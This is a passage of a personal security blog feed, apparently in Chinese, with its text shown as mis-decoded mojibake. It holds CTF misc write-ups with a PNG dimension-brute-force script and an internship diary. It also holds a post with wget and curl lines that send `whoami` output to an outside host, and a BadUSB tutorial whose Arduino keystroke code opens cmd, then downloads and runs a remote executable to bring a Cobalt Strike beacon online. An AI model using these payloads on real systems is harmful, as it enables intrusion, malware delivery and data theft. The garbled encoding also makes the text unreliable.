(wpd)ï¼Œ                  æ–‡ä»¶å¤´ï¼šFF575043</span><br><span class="line">Adobe Acrobat (pdf)ï¼Œ               æ–‡ä»¶å¤´ï¼š255044462D312E</span><br><span class="line">Quicken (qdf)ï¼Œ                         æ–‡ä»¶å¤´ï¼šAC9EBD8F</span><br><span class="line">Windows Password (pwl)ï¼Œ         æ–‡ä»¶å¤´ï¼šE3828596</span><br><span class="line"></span><br><span class="line">RAR Archive (rar)ï¼Œ                    æ–‡ä»¶å¤´ï¼š52617221</span><br><span class="line">Wave (wav)ï¼Œ                            æ–‡ä»¶å¤´ï¼š57415645</span><br><span class="line">AVI (avi)ï¼Œ                                 æ–‡ä»¶å¤´ï¼š41564920</span><br><span class="line">Real Audio (ram)ï¼Œ                     æ–‡ä»¶å¤´ï¼š2E7261FD</span><br><span class="line">Real Media (rm)ï¼Œ                       æ–‡ä»¶å¤´ï¼š2E524D46</span><br><span class="line">MPEG (mpg)ï¼Œ                           æ–‡ä»¶å¤´ï¼š000001BA</span><br><span class="line">MPEG (mpg)ï¼Œ                           æ–‡ä»¶å¤´ï¼š000001B3</span><br><span class="line">Quicktime (mov)ï¼Œ                     æ–‡ä»¶å¤´ï¼š6D6F6F76</span><br><span class="line">Windows Media (asf)ï¼Œ               æ–‡ä»¶å¤´ï¼š3026B2758E66CF11</span><br><span class="line">MIDI (mid)ï¼Œ                              æ–‡ä»¶å¤´ï¼š4D546864</span><br></pre></td></tr></table></figure><p>image-20210512132636816.png<img src="http://cdn.polowong.top/1620813669182k7qlq11e.png?imageslim" alt="paste image"></p><p>æå–rar</p><p>image-20210512132807911.png<img src="http://cdn.polowong.top/16208136734786pvpwoic.png?imageslim" alt="paste image"></p><p>åå…­è¿›åˆ¶è½¬ascii</p><p>flag{My_Name_is_AoBai}</p><h1 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h1><p>zipæ–‡ä»¶å¤´ä¿®å¤</p><p>å¾—åˆ°å¯†æ–‡5a6e4665536e506248206579666b7b39733930733833742d393637312d3433626a2d616f69302d3235663176393138707030377d</p><p>åå…­è¿›åˆ¶è½¬ascii</p><p>ZnFeSnPbH<br>eyfk{9s90s83t-9671-43bj-aoi0-25f1v918pp07}</p><p>ç»´å‰å°¼äºšè§£å¯†ï¼ˆcaptfencoder1.xç‰ˆæœ¬ ç»´å‰å°¼äºšè§£å¯†æœ‰bugï¼‰</p><p>flag{9a90f83e-9671-43ac-bbd0-25b1d918ca07}</p><h1 id="misc-3"><a href="#misc-3" class="headerlink" title="misc 3"></a>misc 3</h1><p>å‹ç¼©åŒ…å¤´éƒ¨ä¿®å¤ï¼Œä¿®æ”¹é”™äº†çš„1ä½</p><p>ç„¶åéœ€è¦å¯†ç ï¼Œç›´æ¥binwalkåˆ†ç¦»å‡ºæ¥ä¸€ä¸ªLinuxå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåˆ°è¿™é‡Œå¡ä½äº†ã€‚ã€‚ç„¶ååé¢çœ‹äº†çœ‹æ–‡ä»¶å¤´åº”è¯¥æ˜¯ä¸ªpngï¼ŒzhiweilaiåŠ ä¸Špngçš„ä¸ºæ–‡ä»¶å¤´åå‘ç°å›¾ç‰‡å®½é«˜æœ‰é—®é¢˜ï¼ŒLinuxæ‰“ä¸å¼€ï¼Œç”¨è„šæœ¬çˆ†ç ´å®½é«˜ä¿®æ”¹å³å¯ã€‚</p><p>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = <span class="built_in">int</span>(all_b[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    data = <span class="built_in">bytearray</span>(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span>            <span class="comment">#ç†è®ºä¸Š0xffffffff,ä½†è€ƒè™‘åˆ°å±å¹•å®é™…/cpuï¼Œ0x0fffå°±å·®ä¸å¤šäº†</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):          <span class="comment">#é«˜å’Œå®½ä¸€èµ·çˆ†ç ´</span></span><br><span class="line">        width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))     <span class="comment">#qä¸º8å­—èŠ‚ï¼Œiä¸º4å­—èŠ‚ï¼Œhä¸º2å­—èŠ‚</span></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;å®½ä¸ºï¼š&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                width1=binascii.b2a_hex(width)</span><br><span class="line">                width1=width1.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                width1=<span class="built_in">int</span>(width1,<span class="number">16</span>)</span><br><span class="line">                <span class="built_in">print</span>(width,width1)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;é«˜ä¸ºï¼š&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                height1=binascii.b2a_hex(height)</span><br><span class="line">                height1=height1.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                height1=<span class="built_in">int</span>(height1,<span class="number">16</span>)</span><br><span class="line">                <span class="built_in">print</span>(height,height1)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>åœ¨å¯¹åº”çš„ä½ç½®ä¿®æ”¹å›¾ç‰‡å®½é«˜çš„åå…­è¿›åˆ¶å€¼å³å¯ã€‚</p><p>image-20210512175308222.png<img src="http://cdn.polowong.top/16208136581593aoz2hnd.png?imageslim" alt="paste image"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å®ä¹ &amp;å­£åº¦æ€»ç»“</title>
      <link href="2021/04/23/%E5%AE%9E%E4%B9%A0-%E5%AD%A3%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>2021/04/23/%E5%AE%9E%E4%B9%A0-%E5%AD%A3%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä»Šå¤©æ˜¯2021å¹´4æœˆ29æ—¥ï¼Œåˆšç»“æŸæŸå¸‚hwé¡¹ç›®ï¼Œåšå®Œè¿™ä¸ªé¡¹ç›®ï¼Œæˆ‘çš„å®ä¹ ç”Ÿæ´»åŸºæœ¬ç®—æ˜¯ç»“æŸäº†ã€‚è¿˜åœ¨é«˜é“ä¸Šï¼Œè¶ç€è¿™ä¸ªæ—¶é—´æ€»ç»“ä¸‹è¿™å››ä¸ªæœˆçš„å®ä¹ &amp;é¡¹ç›®ç”Ÿæ´»ã€‚</p></blockquote><h2 id="é‡‘å±±äº‘å®ä¹ "><a href="#é‡‘å±±äº‘å®ä¹ " class="headerlink" title="é‡‘å±±äº‘å®ä¹ "></a>é‡‘å±±äº‘å®ä¹ </h2><p>ä»Šå¹´ä¸€æœˆä»½ï¼Œå¼€å§‹äº†åœ¨é‡‘å±±äº‘å®ä¹ çš„æ—¥å­ï¼Œæ€»è®¡çº¦ä¸‰ä¸ªæœˆï¼Œå…¶å®å¹²æ´»çš„æ—¶é—´ä¹Ÿå°±å››åæ¥å¤©ï¼Œä¸­é—´ç®—ä¸Šè¿‡å¹´ã€è¯·å‡ä»€ä¹ˆçš„ï¼Œæ‰€ä»¥æ—¥å­å°±æ¯”è¾ƒå°‘äº†ã€‚å’ŒåŒäº‹ä»¬çš„ç›¸å¤„å¾ˆæ„‰å¿«ï¼Œé¢†å¯¼æ˜¯ææŠ€æœ¯çš„ï¼Œç›¸å¤„èµ·æ¥éå¸¸èˆ’æœã€‚åœ¨é‡‘å±±çš„è¿™æ®µæ—¶é—´è¿˜ç®—æ˜¯æ¯”è¾ƒå¿«ä¹çš„ï¼Œè™½ç„¶ç´¯äº†ä¸€ç‚¹ï¼Œä½†æ˜¯æ”¶è·ç›¸å¯¹è¿˜ä¸é”™ã€‚åœ¨é‡‘å±±ï¼Œé¦–å…ˆæ˜¯åœ¨åšé¡¹ç›®çš„è¿‡ç¨‹ä¸­å­¦åˆ°äº†ä¸€äº›çŸ¥è¯†ï¼Œæ¸—é€çš„æ€è·¯ã€æµ‹è¯•æ–¹æ³•å•¥çš„ï¼Œæˆ‘è§‰å¾—è¿™äº›æ¯”è¾ƒé‡è¦ï¼Œå…¶æ¬¡æ˜¯åœ¨å…¬å¸é’“é±¼çš„é¡¹ç›®ä¸­å­¦åˆ°äº†çº¢é˜ŸçŸ¥è¯†ï¼Œå¹¶ä¸”å¼€å¯äº†æˆ‘å¯¹çº¢é˜Ÿå‘å¾€çš„å¤§é—¨ã€‚<br>åœ¨å…¬å¸ï¼Œæˆ‘å­¦åˆ°äº†ä¸€äº›ç®€å•çš„å…æ€æŠ€å·§ï¼Œå¹¶ä¸”è¿˜ä¼šç»§ç»­é’»ç ”ï¼›æ¥è§¦åˆ°äº†é’“é±¼é‚®ä»¶ä¼ªé€ ï¼Œç›®å‰è¿˜åœ¨å­¦ä¹ ï¼›Badusbä¸Šçº¿CSé©¬ï¼Œè¿™ä¸ªå·²ç»å®ç°äº†ã€‚è¿˜æœ‰å°±æ˜¯åŸºæœ¬çš„åº”æ€¥å“åº”æŠ€èƒ½ï¼Œåœ¨å…¬å¸æˆ‘ç‹¬ç«‹å¤„ç†äº†ä¸€èµ·åº”æ€¥å“åº”äº‹ä»¶ï¼Œæˆ‘è§‰å¾—çœŸçš„æ˜¯å¾ˆæ£’çš„å®è·µæœºä¼šã€‚æœ€åæ˜¯ç¤¾äº¤æ–¹é¢ï¼Œè®¤è¯†äº†ä¸€äº›æœ‹å‹ã€‚å…¶ä»–è™šæ— ç¼¥ç¼ˆçš„ä¸è¯´äº†ï¼Œåªè¯´äº›å®é™…çš„ã€‚</p><h2 id="hwè“é˜Ÿ"><a href="#hwè“é˜Ÿ" class="headerlink" title="hwè“é˜Ÿ"></a>hwè“é˜Ÿ</h2><p>ä»Šå¹´hwå»äº†é’è—¤ï¼Œæœ¬æ¥ç­¾äº†æ·±è“ï¼Œæ·±è“çš„è´Ÿè´£äººå¯¹æˆ‘ä¹Ÿå¾ˆå¥½ï¼Œä½†æ˜¯åé¢å‡ºäº†ç‚¹äº‹æƒ…ï¼Œæ‰€ä»¥æˆ‘å°±ç»™é¸½äº†â€¦ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæ„Ÿè°¢ç¡•å“¥ç»™æˆ‘æœºä¼šï¼Œå¼Ÿå¼Ÿé“­è®°åœ¨å¿ƒã€‚è¯´å®åœ¨çš„ï¼Œhwæˆ‘æ˜¯å¤œç­ï¼Œä¸»è¦æ˜¯çœ‹HIDSè®¾å¤‡å‘Šè­¦ï¼Œè¢«åœ°æ–¹çš„ç»™æçƒ¦äº†ï¼Œç»å¸¸æœ‰è¯¯æŠ¥ï¼Œç™½å¤©çš„åŒæ—¶ä¹Ÿå¾ˆè¾›è‹¦ï¼Œæˆ‘è§‰å¾—æˆ‘å¤œç­è¿˜æ˜¯éå¸¸å¹¸è¿çš„ï¼Œå°±æ˜¯èº«ä½“ä¸Šç´¯äº†ç‚¹ã€‚æˆ‘è§‰å¾— é€šè¿‡è¿™æ¬¡hw è®¤è¯†æœ‹å‹æ¯”è¾ƒé‡è¦å§ï¼Œå…¶æ¬¡å°±æ˜¯çœŸçœŸæ­£æ­£åœ°æ¥è§¦äº†ä¸€ä¸‹è¿™ç§å¤§å‹çš„å®‰å…¨é¡¹ç›®ï¼Œä¹‹å‰å¹¶æ²¡æœ‰æ¥è§¦è¿‡ã€‚è¿˜æœ‰å°±æ˜¯åœ¨hwæ—¶çš„ä¸€äº›å¤„ç†äº‹æƒ…çš„æ–¹æ³•ï¼Œæ¯”å¦‚å¤„ç½®æµç¨‹ã€æƒé™ä¸èŒè´£ã€‚ä¹‹ç±»çš„ä¹‹å‰ä¹Ÿåªæ˜¯é™äºç†è®ºï¼Œä¹Ÿæ›´åŠ äº†è§£äº†æˆ‘æƒ³è±¡ä¸­çš„hwå’ŒçœŸå®çš„hwçš„åŒºåˆ«2333.</p><h2 id="hwçº¢é˜Ÿ"><a href="#hwçº¢é˜Ÿ" class="headerlink" title="hwçº¢é˜Ÿ"></a>hwçº¢é˜Ÿ</h2><p>æœ€åæ‰“äº†ä¸€æ¬¡å¿å¸‚çº§çš„hwçº¢é˜Ÿï¼Œå…¶å®è¿˜æ˜¯æŒºä¸¢äººçš„ï¼Œæˆ‘è‡ªå·±çŸ¥é“è‡ªå·±æ°´å¹³ä¸è¡Œï¼Œä½†æ˜¯è¿˜æ˜¯æƒ³å»è¯•è¯•ã€‚è™½ç„¶æœ‹å‹è·Ÿæˆ‘è®²äº†æ˜¯æ— è´£çš„ï¼Œä½†æ˜¯æ‰“äº†é‚£ä¹ˆçƒ‚çš„æˆç»©ï¼Œè‡ªå·±å¿ƒé‡ŒçœŸçš„ä¸å¥½å—ã€‚ã€‚ç›¸æ¯”äºæ‹¿åˆ°å·¥èµ„ï¼Œæ›´å¤šçš„æ˜¯è‡ªè´£å§ã€‚å½“ç„¶äº†ï¼Œåœ¨è¿™æ¬¡çš„çº¢é˜Ÿä¹‹æ—…ä¸­ä¹Ÿå­¦åˆ°äº†ä¸€äº›ä¸œè¥¿ã€‚é¦–å…ˆæ˜¯è‡ªå·±çš„æ¸—é€æ€è·¯é—®é¢˜ï¼Œæ¸—é€æ€è·¯é¦–å…ˆæ˜¯ä¸æ¸…æ™°ï¼Œå…¶æ¬¡æ˜¯å¤ªçª„ã€‚ä¿¡æ¯æ”¶é›†æ—¶ç»å¸¸æœ‰é—æ¼æˆ–è€…å¯¹è¿™ä¸ªç«™åšäº†æŸæ–¹æ³•çš„æ”¶é›†ï¼Œåˆ°äº†ä¸‹ä¸ªç«™å°±å¿˜äº†æˆ–è€…ä¸æƒ³åšäº†ã€‚ã€‚è¿™ä¸ªæ¯›ç—…ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™èƒ½æ”¹æ‰ã€‚å…¶æ¬¡æ˜¯æ¼æ´çš„åŸç†æŒæ¡çš„ä¸å¤Ÿå¥½å’Œæ¼æ´ç±»å‹æŒæ¡çš„ä¸å¤Ÿå¤šï¼Œç»•wafç­‰æ“ä½œéœ€è¦è¾ƒå¼ºçš„åŸºç¡€æ€§çŸ¥è¯†ã€‚å°±åƒsstiç»•è¿‡ä¸€æ ·~ä¸ç®¡æ€ä¹ˆè¯´ï¼Œçº¢é˜Ÿæ¥äº†è¿™ä¸€è¶Ÿæˆ‘ä¸ªäººæ˜¯ä¸äºçš„ï¼Œä½†æ˜¯å¯¹ä¸èµ·æœ‹å‹äº†ã€‚</p><h2 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h2><p>å¸Œæœ›ä¸‹æ¬¡çœ‹åˆ°è¿™ç¯‡åšå®¢ï¼Œèƒ½å¯¹æ¯”å†™æ—¶æœ‰äº›è¿›æ­¥ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ‰§è¡Œç»“æœå¤–å¸¦</title>
      <link href="2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/"/>
      <url>2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/</url>
      
        <content type="html"><![CDATA[<p>wget â€“header=â€test:$(whoami)â€ <a href="http://ssti.com:5000/?username%5C=1">http://ssti.com:5000\?username\=1</a></p><img src="http://cdn.polowong.top/static/images/wget1.png"><p>whoami | curl -F â€œ:data=@-â€œ <a href="http://ssti.com:5000/?username%5C=1">http://ssti.com:5000\?username\=1</a>  </p><img src="http://cdn.polowong.top/static/images/curl1.png"><p>Curl â€œ<a href="http://ssti.com:5000/?username=&#96;whoami&#96;&quot;">http://ssti.com:5000?username=&#96;whoami&#96;&quot;</a></p><img src="http://cdn.polowong.top/static/images/curl2.png">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>badusbè¸©å‘&amp;è¿‘æœŸæ„Ÿæƒ³</title>
      <link href="2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/"/>
      <url>2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼š</p><p>è¿‘æœŸåœ¨å…¬å¸å†…éƒ¨å­¦äº†ä¸€ç‚¹çº¢é˜ŸæŠ€èƒ½ï¼Œè™½ç„¶ç›®å‰ç”¨ä¸ä¸Šï¼Œä½†æ˜¯åšä¸ªè®°å½•ï¼Œé¡ºä¾¿å‘ç‰¢éªšã€‚</p></blockquote><h1 id="è‡´è°¢-amp-å‚è€ƒ"><a href="#è‡´è°¢-amp-å‚è€ƒ" class="headerlink" title="è‡´è°¢&amp;å‚è€ƒ"></a>è‡´è°¢&amp;å‚è€ƒ</h1><p><a href="https://www.freebuf.com/articles/system/261020.html">https://www.freebuf.com/articles/system/261020.html</a></p><p><a href="https://blog.csdn.net/sxhexin/article/details/87914649">https://blog.csdn.net/sxhexin/article/details/87914649</a></p><p><a href="https://www.anquanke.com/post/id/227477">https://www.anquanke.com/post/id/227477</a></p><p><a href="https://www.freebuf.com/articles/system/261020.html">https://www.freebuf.com/articles/system/261020.html</a></p><h1 id="Badusb-æ’å…¥ä¸Šçº¿cobalt-strike"><a href="#Badusb-æ’å…¥ä¸Šçº¿cobalt-strike" class="headerlink" title="Badusb æ’å…¥ä¸Šçº¿cobalt strike"></a>Badusb æ’å…¥ä¸Šçº¿cobalt strike</h1><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><p>ATtiny85 å¼€å‘æ¿ã€arduino IDEä¸‹è½½<a href="https://www.arduino.cc/en/Main/Softwaredigispark%E3%80%82%E6%9A%82%E6%97%B6%E5%85%88%E4%B8%8D%E8%A6%81%E8%A3%85%E9%A9%B1%E5%8A%A8%EF%BC%81%EF%BC%81%E9%A9%B1%E5%8A%A8%E6%9C%89%E5%A4%A7%E5%9D%91%E3%80%82">https://www.arduino.cc/en/Main/Softwaredigisparkã€‚æš‚æ—¶å…ˆä¸è¦è£…é©±åŠ¨ï¼ï¼é©±åŠ¨æœ‰å¤§å‘ã€‚</a></p><p>çœ‹freeebufé‡Œé¢çš„æ•™ç¨‹è£…å®Œé©±åŠ¨ï¼Œçƒ§å½•å®Œåªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œéœ€è¦æ›´æ–°ä¸‹å›ºä»¶æ‰å¯ä»¥é‡å¤ä½¿ç”¨ï¼Œåé¢ä¼šæåˆ°ã€‚</p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>æ‰“å¼€IDE,åœ¨æ–‡ä»¶-&gt;é¦–é€‰é¡¹ä¸­åŠ å…¥é™„åŠ å¼€å‘æ¿ç®¡ç†ï¼Œé™„åŠ å¼€å‘æ¿ç®¡ç†ç½‘å€å¤„å†™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;digistump.com&#x2F;package_digistump_index.json</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œè¿™é‡Œéœ€è¦ç¿»å¢™ï¼Œåé¢æ·»åŠ å¼€å‘æ¿ä¸‹è½½ç›¸å…³é…ç½®æ—¶ä¹Ÿéœ€è¦ç¿»å¢™ï¼Œç°åœ¨å°±ç¿»ç€ åˆ«æ–­äº†ã€‚</p><h2 id="æ·»åŠ å¼€å‘æ¿"><a href="#æ·»åŠ å¼€å‘æ¿" class="headerlink" title="æ·»åŠ å¼€å‘æ¿"></a>æ·»åŠ å¼€å‘æ¿</h2><p>IDEä¸­-å·¥å…·-å¼€å‘æ¿ç®¡ç†ï¼Œç±»å‹-contributed/è´¡çŒ®ï¼Œé€‰æ‹©</p><img src="http://cdn.polowong.top/static/images/boards.png"><p>ç„¶åé€‰å®‰è£…ï¼ˆç¿»å¢™ï¼‰</p><p>å®‰è£…å¥½åï¼Œé€‰æ‹©è¿™ä¸ª16.5mhzçš„å¼€å‘æ¿ã€‚</p><img src="http://cdn.polowong.top/static/images/1655.png"><h2 id="æ›´æ–°-boot-loader"><a href="#æ›´æ–°-boot-loader" class="headerlink" title="æ›´æ–° boot loader"></a>æ›´æ–° boot loader</h2><p>æ›´æ–° BootLoaderçš„æ•™ç¨‹çœ‹ <a href="https://blog.csdn.net/sxhexin/article/details/87914649%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E5%86%8D%E8%B5%98%E8%BF%B0%EF%BC%8C%E8%B7%9F%E7%9D%80%E8%BF%99%E4%B8%AA%E6%95%99%E7%A8%8B%E8%B5%B0%E6%B2%A1%E9%97%AE%E9%A2%98%E7%9A%84%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BD%A0%E4%B9%8B%E5%89%8D%E6%9C%89%E8%A3%85%E7%9B%B8%E5%85%B3%E9%A9%B1%E5%8A%A8%EF%BC%8C%E8%AF%B7%E6%8A%8A%E9%A9%B1%E5%8A%A8%E5%8D%B8%E8%BD%BD%E5%B9%B2%E5%87%80%EF%BC%81%EF%BC%81%EF%BC%81">https://blog.csdn.net/sxhexin/article/details/87914649ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œè·Ÿç€è¿™ä¸ªæ•™ç¨‹èµ°æ²¡é—®é¢˜çš„ï¼Œå¦‚æœä½ ä¹‹å‰æœ‰è£…ç›¸å…³é©±åŠ¨ï¼Œè¯·æŠŠé©±åŠ¨å¸è½½å¹²å‡€ï¼ï¼ï¼</a></p><p>æ›´æ–°BootLoaderæ˜¯å› ä¸ºé¿å…è¸©çƒ§å½•å®Œåªèƒ½è¿è¡Œä¸€æ¬¡çš„å‘ï¼ï¼</p><p>BootLoaderæ˜¯å¤§å‘ï¼Œä¸€å®šè¦å¥½å¥½å¼„ï¼</p><h2 id="ç¼–å†™ä»£ç "><a href="#ç¼–å†™ä»£ç " class="headerlink" title="ç¼–å†™ä»£ç "></a>ç¼–å†™ä»£ç </h2><p>æœ‰å…´è¶£ä¸€æ­¥æ­¥èµ°çš„å¯ä»¥å†™ä¸ªæµ‹è¯•ä»£ç  cmdå¼¹ä¸ªçª—ä»€ä¹ˆçš„ï¼Œæˆ‘è¿™é‡Œä¸€æ­¥åˆ°ä½ï¼Œç›´æ¥è¿œç¨‹åŠ è½½exeã€‚</p><p>å¯¹äºcs å¯ä»¥ç”Ÿæˆpowershellï¼Œç„¶åcmdé‡Œé¢powershellåŠ è½½è°ƒç”¨ç›´æ¥ä¸Šçº¿ã€‚</p><h2 id="ä½¿ç”¨CMDè¿œç¨‹ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶"><a href="#ä½¿ç”¨CMDè¿œç¨‹ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="ä½¿ç”¨CMDè¿œç¨‹ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶"></a>ä½¿ç”¨CMDè¿œç¨‹ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶</h2><p>æˆ‘é€‰æ‹©ç”¨cmdçš„åŸå› æ˜¯å› ä¸º æˆ‘è¿˜ä¸ä¼špowershellå…æ€ï¼ˆ2333ï¼‰</p><p>æ‰€ä»¥ æ¢ç´¢äº†ä¸‹ å¦‚ä½•ç±»ä¼¼Linuxæ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œå‘ç°åœ¨Windows cmdä¸‹æ˜¯andç¬¦å·&amp;ã€‚</p><p>æ‰§è¡Œå‘½ä»¤çš„ä»£ç æ¡†æ¶å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;DigiKeyboard.h&quot;</span><span class="comment">//åº“æ–‡ä»¶</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// setupå‡½æ•°åªè¿è¡Œä¸€æ¬¡</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">2000</span>);<span class="comment">//ç­‰å¾…ä¸¤ç§’ï¼Œç»™ç”µè„‘è‡ªåŠ¨åŠ è½½é…ç½®æ—¶é—´</span></span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<span class="comment">//æ‘ä½WINé”®</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);<span class="comment">//ç­‰å¾…300æ¯«ç§’</span></span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;cmd&quot;</span>);<span class="comment">//è¾“å…¥CMD</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;curl http://12xxxx0/calc.exe &gt; E:\\calc.exe &amp; E:\\calc.exe&quot;</span>);<span class="comment">//æ‰§è¡ŒPAYLOADï¼ŒåŒå¼•å·éœ€è¦æ–œæ è½¬ä¹‰</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œåœ¨æœ€åä¸€ä¸ªæ³¨é‡Šå¤„ï¼Œæ˜¯åœ¨å‰é¢è¯­å¥æ‰“å¼€cmdé»‘æ¡†çš„æƒ…å†µä¸‹ï¼Œåœ¨cmdä¸­è¾“å…¥çš„è¯­å¥ã€‚ä¸¤ä¸ªåæ–œæ æ˜¯ä¸ºäº†è½¬ä¹‰ã€‚</p><p>æˆ‘çš„æ€è·¯æ˜¯ï¼Œå°†å¯æ‰§è¡Œexeæ–‡ä»¶ä¸Šä¼ è‡³æœåŠ¡å™¨ï¼Œé€šè¿‡curlçš„æ–¹å¼ä¸‹è½½å¹¶é‡å®šå‘è‡³æŸä¸ªé©±åŠ¨å™¨å¹¶æ‰§è¡Œã€‚</p><p>æˆ‘æœ¬æ¥æƒ³æ”¾åˆ°Cç›˜ï¼Œä½†æ˜¯æ”¾åˆ°Cç›˜ï¼Œæœ‰å¯èƒ½å­˜åœ¨æƒé™é—®é¢˜ï¼ˆæ”¾åœ¨C:\Windows\Tempï¼‰ç›®å½•ä¸‹ä¹Ÿæœ‰äº›é—®é¢˜ï¼Œäºæ˜¯æ”¾åˆ°äº†D/Eç›˜ã€‚</p><p>å°†ä¸Šè¿°ä»£ç åœ¨IDEä¸­è¾“å…¥åctrl+uä¸Šä¼ ï¼Œç„¶åæ’å…¥attiny85 </p><img src="http://cdn.polowong.top/static/images/in1.png"><p>ä¸€å®šæ˜¯å…ˆæ‹”å‡ºæ¥ï¼Œå‡ºç°è¿™ä¸ª 60secondsçš„æ—¶å€™æ’è¿›å»ï¼Œå‡ºç°ä¸‹é¢è¿™ä¸€ä¸²ä»£è¡¨å†™å…¥æˆåŠŸ å¹¶ä¸”ä¼šè‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡ã€‚</p><p>ç„¶åæ‹”å‡ºæ¥ å†æ’è¿›å»çš„æ—¶å€™ 